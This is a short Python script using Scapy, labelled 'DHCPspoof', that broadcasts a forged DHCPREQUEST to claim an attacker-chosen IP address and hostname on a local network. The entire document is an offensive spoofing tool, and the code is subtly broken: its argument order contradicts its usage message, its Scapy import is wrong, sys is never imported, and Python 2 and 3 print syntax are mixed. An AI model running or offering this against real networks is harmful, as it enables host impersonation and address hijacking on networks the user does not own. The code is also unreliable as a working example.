#!/usr/bin/env python
from scapy import *

def usage():
   print "Usage: DHCPspoof <name> <ip>"
   sys.exit(1)

if len(sys.argv) != 3:
   usage()

requested_ip = sys.argv[1]
requested_name = sys.argv[2]
interface = conf.route.route(requested_ip)[0]
localmac = get_if_hwaddr(interface)
localip = get_if_addr(interface)

print("Sending DHCPREQUEST")

ether = Ether(src="00:00:00:00:00:00", dst="ff:ff:ff:ff:ff:ff")
ip = IP(src="0.0.0.0", dst="255.255.255.255")
udp = UDP(sport=68, dport=67)
bootp = BOOTP(chaddr=localmac, xid=0x11033000)
dhcpOptions = DHCP(options=[('message-type', 'request'), ('hostname', requested_name), ('requested_addr', requested_ip), ('end')])

packet = ether/ip/udp/bootp/dhcpOptions

sendp(packet)
